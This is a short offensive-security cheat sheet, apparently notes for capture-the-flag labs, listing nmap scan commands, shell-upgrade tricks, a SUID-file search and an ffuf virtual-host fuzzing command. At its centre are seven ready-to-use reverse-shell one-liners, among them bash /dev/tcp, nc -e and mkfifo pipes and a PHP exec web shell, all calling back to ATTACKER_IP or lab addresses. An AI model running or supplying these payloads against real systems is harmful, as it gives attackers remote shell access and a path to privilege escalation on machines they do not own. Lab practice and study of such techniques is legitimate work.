Nmap
1. `nmap -sVC -p- -v -T4 -sT --open IP_ADDRESS -oN results`
2. `sudo nmap -sU -p 1-1024 -v IP_ADDRESS -oA results_UDP`

Reverse shell
1. ` bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' ` - the `&` needs to be encoded if sending over URL
2. `echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > rev.sh`
3. `nc -e /bin/bash [YOUR_IP] 4444`
4. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f`
5. `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>`
6. ` echo -e '#!/bin/bash\n\nnc -e /bin/bash 10.10.14.77 4444' >> revshell `
7. ` echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.77/4444 0>&1' >> revshell `

Upgrade shell
1. `python3 -c 'import pty; pty.spawn("/bin/sh")' `
2. ` stty raw -echo; fg `, then ` reset `
3. ` stty erase ^h ` (if the backspace is not working)
4. ` script /dev/null -c bash `
5. ` socat file:tty,raw,echo=0 tcp-listen:5555 ` - start `socat` listener, ` socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.77:5555 ` on victim machine

Linux find SUID files
1. `find / -type f -perm -04000 -ls 2>/dev/null`

VHOST Enumeration
1. ` ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://example.com/ -H "Host: FUZZ.example.com" -mc all -fw <> `